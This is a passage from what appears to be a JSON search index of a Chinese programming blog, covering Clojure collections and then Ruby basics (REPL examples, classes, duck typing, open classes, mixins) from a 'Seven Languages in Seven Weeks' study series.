&#x27;(<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>))</span><br><span class=\"line\"><span class=\"symbol\">:four</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">rest</span></span> &#x27;(<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>))</span><br><span class=\"line\">(<span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>)</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">cons</span></span> <span class=\"symbol\">:zero</span> &#x27;(<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>))</span><br><span class=\"line\">(<span class=\"symbol\">:zero</span> <span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>)</span><br></pre></td></tr></table></figure>\n<p>注意:<strong>clojure中的动态类型中，0和””都可以被映射为true，而nil映射为false</strong></p>\n</li>\n<li><p>向量（Vector）<br>向量是<strong>有序</strong>的可以循秩访问的元素集合，支持了随机访问的优化，用方括号扩起来表示。作为i表的兄弟，向量也支持表的基本算子，向量额外支持了随机访问算子：<code>nth</code></p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>]</span><br><span class=\"line\">[<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>]</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\">clojure.lang.PersistentVector</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">first</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\"><span class=\"symbol\">:one</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">last</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\"><span class=\"symbol\">:four</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">rest</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\">(<span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>)</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">cons</span></span> <span class=\"symbol\">:zero</span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\">(<span class=\"symbol\">:zero</span> <span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>)</span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">nth</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>] <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"symbol\">:four</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">nth</span></span> [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>] <span class=\"number\">4</span>)</span><br><span class=\"line\">Execution error (<span class=\"name\">IndexOutOfBoundsException</span>) at user/eval<span class=\"number\">2173</span> (<span class=\"name\">REPL:1</span>).</span><br><span class=\"line\">null</span><br></pre></td></tr></table></figure>\n<p>向量还支持合并两个向量：</p>\n<figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">concat</span></span> [<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span> <span class=\"number\">4</span>] [<span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>])</span><br><span class=\"line\">(<span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span> <span class=\"number\">4</span> <span class=\"symbol\">:one</span> <span class=\"symbol\">:two</span> <span class=\"symbol\">:three</span> <span class=\"symbol\">:four</span>)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>集合（Set）</p>\n</li>\n</ol>\n<h2 id=\"特性-1\"><a href=\"#特性-1\" class=\"headerlink\" title=\"特性\"></a>特性</h2><h3 id=\"延迟执行\"><a href=\"#延迟执行\" class=\"headerlink\" title=\"延迟执行\"></a>延迟执行</h3><figure class=\"highlight clojure\"><table><tr><td class=\"code\"><pre><span class=\"line\">user=&gt; (/ <span class=\"number\">1</span> <span class=\"number\">3</span>)</span><br><span class=\"line\"><span class=\"number\">1</span>/<span class=\"number\">3</span></span><br><span class=\"line\">user=&gt; (<span class=\"name\"><span class=\"builtin-name\">class</span></span>(/ <span class=\"number\">1</span> <span class=\"number\">3</span>))</span><br><span class=\"line\">clojure.lang.Ratio</span><br></pre></td></tr></table></figure>\n<p>可以看到在执行不能除尽的整数除法计算时，clojure不会立即计算结果，而是会通分化简，这在执行计算时可以保留精度。</p>\n","categories":["《七周七语言》"],"tags":["Clojure"]},{"title":"七周七语言之-Ruby","url":"/2019/06/05/%E4%B8%83%E5%91%A8%E4%B8%83%E8%AF%AD%E8%A8%80%E4%B9%8B-Ruby/","content":"<blockquote>\n<p>最近突然有兴趣翻开了队友从队里順来的一本书Bruce.A.Tate的《七周七语言 理解多种编程范式》，正好实训划水无事可干，打算写一个系列，涉及Ruby Lo Prolog Scala Erlang Clojure Haskell,对他们的特性，编程模型做一个简要的理解。语法一笔带过，日后详细学习的日后再补上</p>\n</blockquote>\n<h1 id=\"开始\"><a href=\"#开始\" class=\"headerlink\" title=\"开始\"></a>开始</h1><ul>\n<li>环境：Archlinux</li>\n<li>编辑器：VsCode</li>\n<li><a href=\"https://www.runoob.com/ruby/ruby-tutorial.html\">菜鸟教程Ruby</a></li>\n<li><a href=\"http://www.ruby-lang.org/zh_cn/\">Ruby官方中文文档</a></li>\n</ul>\n<span id=\"more\"></span>\n<h2 id=\"安装Ruby\"><a href=\"#安装Ruby\" class=\"headerlink\" title=\"安装Ruby\"></a>安装Ruby</h2><p>安装ruby：<code>sudo pacman -S ruby</code><br>安装irb交互shell：<code>sudo pacman -S irb</code><br>安装成功后，查看版本号，执行第一个hello world程序：<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ruby</span> -v</span><br><span class=\"line\">ruby 2.6.3p62 (2019-04-16 revision 67580) [x86_64-linux]</span><br><span class=\"line\"><span class=\"variable\">$irb</span></span><br><span class=\"line\">irb(main):002:0&gt; puts <span class=\"string\">&#x27;hello world&#x27;</span></span><br><span class=\"line\">hello world</span><br><span class=\"line\">=&gt; nil</span><br></pre></td></tr></table></figure><br>和python类似，ruby有解释模式和交互模式，ruby脚本常以<code>*.rb</code>命名，和python一样需要指定编码，否则中文输入会出现问题：<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/ruby -w</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\">puts <span class=\"string\">&quot;你好，世界！&quot;</span>;</span><br></pre></td></tr></table></figure><br>存为<code>hello.rb</code>可以用<code>ruby hello.rb</code>解释执行</p>\n<h1 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h1><h2 id=\"BEGIN-END代码块\"><a href=\"#BEGIN-END代码块\" class=\"headerlink\" title=\"BEGIN END代码块\"></a>BEGIN END代码块</h2><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/usr/bin/ruby</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\">puts <span class=\"string\">&quot;这是主 Ruby 程序&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">END</span> &#123;</span><br><span class=\"line\">   puts <span class=\"string\">&quot;停止 Ruby 程序&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">BEGIN</span> &#123;</span><br><span class=\"line\">   puts <span class=\"string\">&quot;初始化 Ruby 程序&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>BEGIN,END会分别在主程序的执行前/后执行，输入结果如下：<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">初始化 Ruby 程序</span><br><span class=\"line\">这是主 Ruby 程序</span><br><span class=\"line\">停止 Ruby 程序</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Here-Document\"><a href=\"#Here-Document\" class=\"headerlink\" title=\"Here Document\"></a>Here Document</h2><p>详细见：<a href=\"https://www.runoob.com/ruby/ruby-syntax.html\">菜鸟教程</a></p>\n<h2 id=\"注释\"><a href=\"#注释\" class=\"headerlink\" title=\"注释\"></a>注释</h2><p>类似python等脚本语言，ruby的行注释也是<code>#</code><br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># i am comment</span></span><br></pre></td></tr></table></figure><br>但ruby支持块注释<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">=begin</span></span><br><span class=\"line\"><span class=\"comment\">i am comment</span></span><br><span class=\"line\"><span class=\"comment\">=end</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"容器\"><a href=\"#容器\" class=\"headerlink\" title=\"容器\"></a>容器</h2><h3 id=\"数组\"><a href=\"#数组\" class=\"headerlink\" title=\"数组\"></a>数组</h3><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\">ary = [ <span class=\"string\">&quot;fred&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">3.14</span>, <span class=\"string\">&quot;This is a string&quot;</span>, <span class=\"string\">&quot;last element&quot;</span>, ]</span><br><span class=\"line\">ary[<span class=\"number\">0</span>]</span><br><span class=\"line\">ary[-<span class=\"number\">1</span>]</span><br><span class=\"line\">ary[<span class=\"number\">0</span>..<span class=\"number\">2</span>]</span><br></pre></td></tr></table></figure>\n<p>ruby的数组是广义表，类似js，创建非常方便，且支持<code>pop</code>，<code>push</code><br>ruby的数组访问和python，R一样灵活，支持副负数下标逆序访问，也支持区间访问。</p>\n<h3 id=\"Map\"><a href=\"#Map\" class=\"headerlink\" title=\"Map\"></a>Map</h3><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):035:0&gt;</span> dic = &#123;<span class=\"string\">&quot;me&quot;</span>=&gt;<span class=\"string\">&quot;XUranus&quot;</span>,<span class=\"string\">&quot;renying&quot;</span>=&gt;<span class=\"string\">&quot;thankod&quot;</span>&#125;</span><br><span class=\"line\">=&gt; &#123;<span class=\"string\">&quot;me&quot;</span>=&gt;<span class=\"string\">&quot;XUranus&quot;</span>, <span class=\"string\">&quot;renying&quot;</span>=&gt;<span class=\"string\">&quot;thankod&quot;</span>&#125;</span><br></pre></td></tr></table></figure>\n<p>类似py的字典，语法糖更好看</p>\n<h2 id=\"判断\"><a href=\"#判断\" class=\"headerlink\" title=\"判断\"></a>判断</h2><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):037:0&gt;</span> puts <span class=\"string\">&#x27;awesome man&#x27;</span> <span class=\"keyword\">unless</span> <span class=\"number\">1</span>==<span class=\"number\">2</span></span><br><span class=\"line\">awesome man</span><br><span class=\"line\">=&gt; nil</span><br><span class=\"line\"><span class=\"meta\">irb(main):038:0&gt;</span> puts <span class=\"string\">&#x27;take a look&#x27;</span> if <span class=\"number\">1</span>&lt;<span class=\"number\">2</span></span><br><span class=\"line\">take a look</span><br></pre></td></tr></table></figure>\n<p>ruby的条件判断语法糖极其丰富，接近自然语言甚至支持倒装句！但是要注意if后面的判断除了<code>nil</code>和<code>false</code>全是<code>true</code>，<strong>即使是0也是<code>true</code>！！！</strong></p>\n<h2 id=\"类-方法\"><a href=\"#类-方法\" class=\"headerlink\" title=\"类 方法\"></a>类 方法</h2><p>一个Tree容器<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Tree</span> <span class=\"comment\">#类名首字母大写</span></span></span><br><span class=\"line\">  <span class=\"keyword\">attr_accessor</span> <span class=\"symbol\">:children</span>, <span class=\"symbol\">:node_name</span> <span class=\"comment\">#定义实例成员变量</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">initialize</span><span class=\"params\">(name,children=[])</span></span> <span class=\"comment\">#类似py的optional param 和py的区别在于没有：</span></span><br><span class=\"line\">    <span class=\"variable\">@children</span>=children </span><br><span class=\"line\">    <span class=\"variable\">@node_name</span>=name <span class=\"comment\">#成员变量赋值用@代替this</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">(&amp;block)</span></span> <span class=\"comment\">#&amp;不是表示去引用，而是表示这个是一个代码快</span></span><br><span class=\"line\">    block.call <span class=\"keyword\">self</span> </span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit_all</span><span class=\"params\">(&amp;block)</span></span></span><br><span class=\"line\">    visit(&amp;block)</span><br><span class=\"line\">    children.each &#123;<span class=\"params\">|x|</span>x.visit_all &amp;block&#125;</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">ruby_tree = Tree.new(<span class=\"string\">&quot;Ruby&quot;</span>,[Tree.new(<span class=\"string\">&quot;scala&quot;</span>),Tree.new(<span class=\"string\">&quot;java&quot;</span>)])</span><br><span class=\"line\">ruby_tree.visit_all &#123;<span class=\"params\">|node|</span>puts node.node_name&#125;</span><br></pre></td></tr></table></figure><br>打印出<br><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Ruby</span><br><span class=\"line\">scala</span><br><span class=\"line\">java</span><br></pre></td></tr></table></figure></p>\n<h1 id=\"特性\"><a href=\"#特性\" class=\"headerlink\" title=\"特性\"></a>特性</h1><p>Ruby 可以用来编写通用网关接口（CGI）脚本，可以被嵌入到超文本标记语言（HTML），可以轻易链接数据库，有丰富的内置函数和GUI工具。</p>\n<h2 id=\"真正面向对象\"><a href=\"#真正面向对象\" class=\"headerlink\" title=\"真正面向对象\"></a>真正面向对象</h2><p>Ruby是一门<strong>真正面向对象</strong>的语言，java在基本类型（double,float…）还是用了过程语言的写法，有时需要Double来解包。而ruby即使是基本类型也是对象：<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):015:0&gt;</span> <span class=\"number\">4</span>.class</span><br><span class=\"line\">=&gt; Integer</span><br><span class=\"line\"><span class=\"meta\">irb(main):016:0&gt;</span> (<span class=\"number\">2</span>==<span class=\"number\">3</span>).class</span><br><span class=\"line\">=&gt; FalseClass</span><br><span class=\"line\"><span class=\"meta\">irb(main):004:0&gt;</span> <span class=\"number\">4</span>.class.superclass</span><br><span class=\"line\">=&gt; Numeric</span><br></pre></td></tr></table></figure><br>在全局环境中，默认当前是main函数<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):007:0&gt;</span> self</span><br><span class=\"line\">=&gt; main</span><br><span class=\"line\"><span class=\"meta\">irb(main):008:0&gt;</span> self.class</span><br><span class=\"line\">=&gt; Object</span><br><span class=\"line\"><span class=\"meta\">irb(main):009:0&gt;</span> self.class.superclass</span><br><span class=\"line\">=&gt; BasicObject</span><br><span class=\"line\"><span class=\"meta\">irb(main):010:0&gt;</span> self.class.superclass.superclass</span><br><span class=\"line\">=&gt; nil</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"强类型\"><a href=\"#强类型\" class=\"headerlink\" title=\"强类型\"></a>强类型</h2><p>尽管ruby是一门脚本语言，但ruby是强类型的！这一点和js的不一样，相比用不报错的js这一点的确很好。脚本语言需要在运行时候做类型检查，ruby充分的平衡了运行时类型检查和语言灵活性。<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):017:0&gt;</span> a = <span class=\"string\">&#x27;hello &#x27;</span></span><br><span class=\"line\">=&gt; <span class=\"string\">&quot;hello &quot;</span></span><br><span class=\"line\"><span class=\"meta\">irb(main):018:0&gt;</span> b = <span class=\"number\">1</span></span><br><span class=\"line\">=&gt; <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"meta\">irb(main):019:0&gt;</span> a+b</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">        <span class=\"number\">5</span>: from /usr/bin/<span class=\"symbol\">irb:</span><span class=\"number\">23</span><span class=\"symbol\">:in</span> <span class=\"string\">`&lt;main&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        4: from /usr/bin/irb:23:in `</span>load<span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        3: from /usr/lib/ruby/gems/2.6.0/gems/irb-1.0.0/exe/irb:11:in `&lt;top (required)&gt;&#x27;</span></span><br><span class=\"line\">        <span class=\"number\">2</span>: from (irb)<span class=\"symbol\">:</span><span class=\"number\">19</span></span><br><span class=\"line\">        <span class=\"number\">1</span>: from (irb)<span class=\"symbol\">:</span><span class=\"number\">19</span><span class=\"symbol\">:in</span> <span class=\"string\">`+&#x27;</span></span><br><span class=\"line\"><span class=\"string\">TypeError (no implicit conversion of Integer into String)</span></span><br></pre></td></tr></table></figure><br>可见不同的类型是不能操作的</p>\n<h2 id=\"代码块与函数\"><a href=\"#代码块与函数\" class=\"headerlink\" title=\"代码块与函数\"></a>代码块与函数</h2><p>Ruby中函数也是以及公民，可以被当作参数传递，写个遍历容器的例子：<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):001:0&gt;</span> ary = [ <span class=\"string\">&quot;fred&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">3.14</span>, <span class=\"string\">&quot;This is a string&quot;</span>, <span class=\"string\">&quot;last element&quot;</span>, ]</span><br><span class=\"line\">=&gt; [<span class=\"string\">&quot;fred&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">3.14</span>, <span class=\"string\">&quot;This is a string&quot;</span>, <span class=\"string\">&quot;last element&quot;</span>]</span><br><span class=\"line\"><span class=\"meta\">irb(main):002:0&gt;</span> ary.each&#123;<span class=\"params\">|x|</span>puts x&#125;</span><br><span class=\"line\">fred</span><br><span class=\"line\"><span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">3.14</span></span><br><span class=\"line\">This is a string</span><br><span class=\"line\">last element</span><br></pre></td></tr></table></figure><br>这种类似js的<code>arr.foreach(x=&gt;console.log(x))</code>,然而我觉得这种<code>=&gt;</code>要好看的多，<code>|x|</code>的写法很丑，但是Rust好像也用了这种语法糖！<br>下面这种写法也等价，（看似这种以do end封装的代码快类似一种匿名函数？且享有执行区的作用域？）<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):009:0&gt;</span> ary.each do <span class=\"params\">|i|</span></span><br><span class=\"line\">irb(main)<span class=\"symbol\">:</span><span class=\"number\">010</span><span class=\"symbol\">:</span><span class=\"number\">1</span>*     puts i</span><br><span class=\"line\"><span class=\"meta\">irb(main):011:1&gt;</span> end</span><br><span class=\"line\">fred</span><br><span class=\"line\"><span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"number\">3.14</span></span><br><span class=\"line\">This is a string</span><br><span class=\"line\">last element</span><br><span class=\"line\">=&gt; [<span class=\"string\">&quot;fred&quot;</span>, <span class=\"number\">10</span>, <span class=\"number\">3.14</span>, <span class=\"string\">&quot;This is a string&quot;</span>, <span class=\"string\">&quot;last element&quot;</span>]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"鸭子类型\"><a href=\"#鸭子类型\" class=\"headerlink\" title=\"鸭子类型\"></a>鸭子类型</h2><p>上个例子中<code>[&quot;fred&quot;, 10, 3.14, &quot;This is a string&quot;, &quot;last element&quot;]</code>，我们可以发现这个容器是一个广义表序列，ruby不需要容器具有相同的类型，实际上此处并不是执行了动态类型推断，而是得易于ruby的面向对象机制，实际上此处的对象都有着共同的基类Object。</p>\n<p>当我们执行力<code>puts</code>输出后，其实是执行了他们的共有的<code>to_s()</code>方法提取了字符串化的输出信息，<em>“只要他走路像鸭子，他能嘎嘎叫，他就是鸭子”</em>，这就是ruby的鸭子类型。ruby的数组支持<code>pop</code>，<code>push</code>，所以就可以当作栈来用。</p>\n<p>ruby是在运行时进行动态类型推导的，但是这也带来了问题<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):012:0&gt;</span> <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">hello</span></span></span><br><span class=\"line\"><span class=\"meta\">irb(main):013:1&gt;</span> <span class=\"string\">&#x27;hello&#x27;</span>+<span class=\"number\">42</span></span><br><span class=\"line\"><span class=\"meta\">irb(main):014:1&gt;</span> end</span><br><span class=\"line\">=&gt; <span class=\"symbol\">:hello</span></span><br><span class=\"line\"><span class=\"meta\">irb(main):015:0&gt;</span> hello</span><br><span class=\"line\">Traceback (most recent call last):</span><br><span class=\"line\">        <span class=\"number\">6</span>: from /usr/bin/<span class=\"symbol\">irb:</span><span class=\"number\">23</span><span class=\"symbol\">:in</span> <span class=\"string\">`&lt;main&gt;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        5: from /usr/bin/irb:23:in `</span>load<span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        4: from /usr/lib/ruby/gems/2.6.0/gems/irb-1.0.0/exe/irb:11:in `&lt;top (required)&gt;&#x27;</span></span><br><span class=\"line\">        <span class=\"number\">3</span>: from (irb)<span class=\"symbol\">:</span><span class=\"number\">15</span></span><br><span class=\"line\">        <span class=\"number\">2</span>: from (irb)<span class=\"symbol\">:</span><span class=\"number\">13</span><span class=\"symbol\">:in</span> <span class=\"string\">`hello&#x27;</span></span><br><span class=\"line\"><span class=\"string\">        1: from (irb):13:in `</span>+<span class=\"string\">&#x27;</span></span><br><span class=\"line\"><span class=\"string\">TypeError (no implicit conversion of Integer into String)</span></span><br></pre></td></tr></table></figure><br>这个例子中，方法定义时没有做类型检查，只有运行时才发现错误，导致了ruby不能有效的抛出错误。</p>\n<h2 id=\"运算符\"><a href=\"#运算符\" class=\"headerlink\" title=\"运算符\"></a>运算符</h2><p>执行基本的加法运算<code>4+3</code>,因为ruby是面向对象语言，所以这里<code>+</code>是一种add方法，他的名字叫<code>+</code>，实际上调用是调用的<code>4.+(3)</code><br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):032:0&gt;</span> <span class=\"number\">4</span>.+(<span class=\"number\">3</span>)</span><br><span class=\"line\">=&gt; <span class=\"number\">7</span></span><br></pre></td></tr></table></figure><br>可以用<code>.methods</code>查看一个类型的方法<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">irb(main):031:0&gt;</span> <span class=\"number\">4</span>.methods</span><br><span class=\"line\">=&gt; [<span class=\"symbol\">:-@</span>, <span class=\"symbol\">:**</span>, <span class=\"symbol\">:&lt;=&gt;</span>, <span class=\"symbol\">:upto</span>, <span class=\"symbol\">:&lt;&lt;</span>, <span class=\"symbol\">:&lt;=</span>, <span class=\"symbol\">:&gt;=</span>, <span class=\"symbol\">:==</span>, <span class=\"symbol\">:chr</span>, <span class=\"symbol\">:===</span>, <span class=\"symbol\">:&gt;&gt;</span>, <span class=\"symbol\">:[]</span>, <span class=\"symbol\">:%</span>, <span class=\"symbol\">:&amp;</span>, <span class=\"symbol\">:inspect</span>, <span class=\"symbol\">:*</span>, <span class=\"symbol\">:+</span>, <span class=\"symbol\">:ord</span>, <span class=\"symbol\">:-</span>, <span class=\"symbol\">:/</span>, <span class=\"symbol\">:size</span>, <span class=\"symbol\">:succ</span>, <span class=\"symbol\">:&lt;</span>, <span class=\"symbol\">:&gt;</span>, <span class=\"symbol\">:to_int</span>, <span class=\"symbol\">:coerce</span>, <span class=\"symbol\">:to_s</span>, <span class=\"symbol\">:to_i</span>, <span class=\"symbol\">:to_f</span>, ....]</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"开放类\"><a href=\"#开放类\" class=\"headerlink\" title=\"开放类\"></a>开放类</h2><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NilClass</span> <span class=\"comment\">#NillClass和String都是ruby的内建基类</span></span></span><br><span class=\"line\">  def blank? <span class=\"comment\">#这里如果是java也许是isBlank()，允许？可以说是ruby的一个feature了</span></span><br><span class=\"line\">    <span class=\"literal\">true</span>  <span class=\"comment\">#如果最后一行表达式的值为返回值，不必return</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">String</span></span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">blank?</span></span></span><br><span class=\"line\">    <span class=\"keyword\">self</span>.size == <span class=\"number\">0</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">irb(main):025:0&gt; nil.blank?</span><br><span class=\"line\">=&gt; true</span><br><span class=\"line\">irb(main):026:0&gt; &quot;&quot;.blank?</span><br><span class=\"line\">=&gt; true</span><br><span class=\"line\">irb(main):027:0&gt; &quot;person&quot;.blank?</span><br><span class=\"line\">=&gt; false</span><br></pre></td></tr></table></figure>\n<p>ruby不像java，需要继承一个类，并重写某个方法来改变类的特性。ruby支持开放类，<code>class XXX</code>申明某个类，如果没有被定义则定义该类，如果定义了就增加/重写这个类的某个方法。</p>\n<h2 id=\"Mixin\"><a href=\"#Mixin\" class=\"headerlink\" title=\"Mixin\"></a>Mixin</h2><p>面向对象复用代码的一个典型方法就是继承，但是要同时继承多个类的行为要用到多继承，事实证明这会带来很多问题，所以java采用了单继承+接口的策略，而ruby则是采用<strong>模块</strong>。模块是函数和常量的集合，这点很像scala的trait<br><figure class=\"highlight ruby\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">module</span> <span class=\"title\">ToFile</span> </span></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">file</span></span></span><br><span class=\"line\">    <span class=\"string\">&quot;object_<span class=\"subst\">#&#123;<span class=\"keyword\">self</span>.object_id&#125;</span>.txt&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_f</span></span></span><br><span class=\"line\">    File.open(filename,<span class=\"string\">&#x27;w&#x27;</span>) &#123;<span class=\"params\">|f|</span>f.write(to_s)&#125; <span class=\"comment\">#注意这里的to_s</span></span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span> </span></span><br><span class=\"line\">  <span class=\"keyword\">include</span> ToFile</span><br><span class=\"line\">  <span class=\"symbol\">attr_accessor:</span>name</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">initialize</span><span class=\"params\">(name)</span></span></span><br><span class=\"line\">    <span class=\"variable\">@name</span>=name</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_s</span></span></span><br><span class=\"line\">    name</span><br><span class=\"line\">  <span class=\"keyword\">end</span></span><br><span class=\"line\"><span class=\"keyword\">end</span></span><br><span class=\"line\"></span><br><span class=\"line\">Person.new(<span 